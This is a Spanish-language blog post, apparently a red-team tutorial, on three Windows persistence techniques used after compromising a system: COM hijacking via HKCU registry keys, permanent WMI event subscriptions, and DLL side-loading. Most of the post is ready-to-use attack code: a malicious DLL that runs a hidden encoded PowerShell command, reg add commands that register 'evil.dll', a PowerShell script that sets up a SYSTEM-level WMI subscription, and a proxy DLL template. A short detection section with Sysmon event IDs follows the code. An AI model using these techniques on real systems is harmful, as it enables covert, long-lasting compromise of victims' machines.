---
layout: single
title: "Persistencia en Windows: COM Hijacking, WMI Event Subscriptions y DLL Side-Loading"
date: 2026-07-16
categories: [malware, tutoriales]
tags: [persistence, com-hijacking, wmi, dll-side-loading, windows, post-exploitation, red-team]
excerpt: "Tres técnicas de persistencia usadas por APTs en entornos Windows: COM hijacking via HKCU, suscripciones WMI permanentes y DLL side-loading en aplicaciones privilegiadas."
permalink: /malware/persistencia-windows-com-wmi-dll/
---

Después de comprometer un sistema, mantener el acceso sin generar ruido es el reto real. Las técnicas de persistencia que se estudian a continuación no requieren escalar privilegios si ya se dispone de acceso de usuario estándar en algunos casos, y son habituales en los TTPs de APTs documentados —Lazarus Group, APT29, FIN7— porque esquivan las detecciones más básicas.

Se cubren tres técnicas distintas: COM Hijacking mediante claves HKCU, suscripciones WMI permanentes y DLL Side-Loading.

---

## COM Hijacking via HKCU

El Component Object Model (COM) es el mecanismo de Microsoft para la comunicación entre componentes binarios. Cuando una aplicación instancia un objeto COM, Windows busca el CLSID correspondiente en el registro siguiendo un orden de precedencia:

1. `HKCU\Software\Classes\CLSID\{...}` (usuario actual)
2. `HKLM\Software\Classes\CLSID\{...}` (máquina)

La clave HKCU no requiere privilegios elevados. Si una aplicación que corre con más permisos intenta cargar un CLSID cuya entrada en HKLM apunta a una DLL legítima, pero ese CLSID no existe en HKCU, el atacante puede registrar ahí una DLL maliciosa. La aplicación la cargará sin advertencia.

### Encontrar candidatos con Process Monitor

Filtrar en Procmon con:

```
Operation = RegOpenKey
Result = NAME NOT FOUND
Path begins with HKCU\Software\Classes\CLSID
```

Esto lista todos los CLSIDs que aplicaciones buscan en HKCU y no encuentran. Se elige uno que pertenezca a un proceso privilegiado o que se ejecute frecuentemente (explorer.exe, taskhost, etc.).

```
CLSID: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
Process: explorer.exe (PID: 1234)
Path: HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32
Result: NAME NOT FOUND
```

### Plantar la DLL

```c
// persistence_com.c — DLL maliciosa
#include <windows.h>

void Payload(void) {
    // shellcode, reverse shell, beacon, etc.
    WinExec("cmd.exe /c powershell -enc BASE64PAYLOAD", SW_HIDE);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        Payload();
    }
    return TRUE;
}
```

Registrar el CLSID:

```cmd
reg add "HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32" ^
    /v "" /t REG_SZ /d "C:\Users\victim\AppData\Roaming\evil.dll" /f

reg add "HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32" ^
    /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
```

La próxima vez que el proceso cargue ese CLSID, ejecutará `evil.dll` sin elevar UAC y sin escribir en HKLM.

---

## WMI Event Subscriptions permanentes

Windows Management Instrumentation expone una infraestructura de eventos en la que es posible registrar suscripciones persistentes: sobreviven a reinicios, corren en contexto SYSTEM y no dejan artefactos obvios en el registro ni en las carpetas de inicio habituales.

Una suscripción permanente tiene tres componentes:

| Componente | Clase WMI | Función |
|---|---|---|
| EventFilter | `__EventFilter` | Define el evento que dispara la acción |
| EventConsumer | `CommandLineEventConsumer` / `ActiveScriptEventConsumer` | Define qué ejecutar |
| Binding | `__FilterToConsumerBinding` | Une filtro y consumidor |

### Crear la suscripción

```powershell
# Filtro: cada vez que el sistema lleve 200 segundos encendido
$FilterArgs = @{
    Name       = 'PersistenceFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage  = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Consumidor: ejecuta comando arbitrario
$ConsumerArgs = @{
    Name             = 'PersistenceConsumer'
    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -enc BASE64PAYLOAD'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Binding: une filtro y consumidor
$BindingArgs = @{
    Filter   = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

Para verificar que quedó registrado:

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

Para limpiar (como atacante o como defensor haciendo rollback):

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='PersistenceFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='PersistenceConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

El payload corre como el servicio WMI host (`WmiPrvSE.exe`), hereda contexto SYSTEM y no aparece en las ubicaciones de inicio estándar.

---

## DLL Side-Loading

El loader de Windows busca DLLs en un orden determinado (SafeDllSearchMode habilitado por defecto desde Vista):

1. Directorio de la aplicación
2. System32
3. System16 (si aplica)
4. Directorio de Windows
5. Directorio actual
6. Directorios del PATH

Si una aplicación legítima con firma digital carga una DLL por nombre relativo y esa DLL no existe en su directorio, el atacante puede colocar ahí una DLL maliciosa. La aplicación firmada actúa de loader y el proceso hijo hereda su reputación.

### Encontrar candidatos

```python
# Listar DLLs cargadas por un proceso que no tienen ruta absoluta
import subprocess
import re

output = subprocess.check_output(
    ['Listdlls.exe', '-u', 'explorer.exe'],  # Sysinternals
    text=True
)
# Buscar entradas sin ruta completa o con base en directorio de app
for line in output.splitlines():
    if re.search(r'^\s+\d+\s+\S+\.dll\s*$', line, re.IGNORECASE):
        print(line)
```

Alternativamente con Process Monitor, filtrar `CreateFile` con `Result = NAME NOT FOUND` y `Path ends with .dll`.

### Proxy DLL

Cuando la DLL objetivo exporta funciones que la aplicación usa, la DLL maliciosa debe re-exportarlas (proxy) para no romper la funcionalidad y levantar sospechas:

```c
// proxy_version.c — ejemplo para version.dll (32-bit)
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@2")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@3")
// ... resto de exports

#include <windows.h>

void Payload(void) {
    // stage dropper, beacon, etc.
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
    }
    return TRUE;
}
```

Compilar como DLL con el mismo nombre que la legítima y copiar al directorio de la aplicación objetivo. La herramienta [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) automatiza la generación del proxy a partir de una DLL real.

---

## Detección

| Técnica | Artefacto | Detección |
|---|---|---|
| COM Hijacking | HKCU claves CLSID nuevas | Sysmon Event ID 13 (SetValue), auditoría de registro |
| WMI Subscriptions | `root\subscription` WMI namespace | Sysmon Event ID 20/21 (WmiEvent), `Get-WmiObject` periódico |
| DLL Side-Loading | DLL en directorio de app firmada | Sysmon Event ID 7 (ImageLoad), Image Loaded sin firma Microsoft |

Sysmon con configuración SwiftOnSecurity o Olaf Hartong cubre los tres vectores. Para WMI en específico, el Event ID 5861 del canal `Microsoft-Windows-WMI-Activity/Operational` registra la creación de suscripciones.

EDRs modernos (Defender for Endpoint, CrowdStrike) detectan las suscripciones WMI con alta fiabilidad. COM hijacking y DLL side-loading tienen tasas de detección más bajas porque la carga de DLLs legítimas no siempre es inspeccionada en el contexto de la aplicación padre.

---

## Referencias

- [MITRE ATT&CK T1546.015 - COM Hijacking](https://attack.mitre.org/techniques/T1546/015/)
- [MITRE ATT&CK T1546.003 - WMI Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
- [MITRE ATT&CK T1574.002 - DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
- [SpecterOps - Subverting Trust in Windows](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)
- [Matt Graeber - Abusing WMI to Build a Persistent Asynchronous and Fileless Backdoor](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf)
- [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)
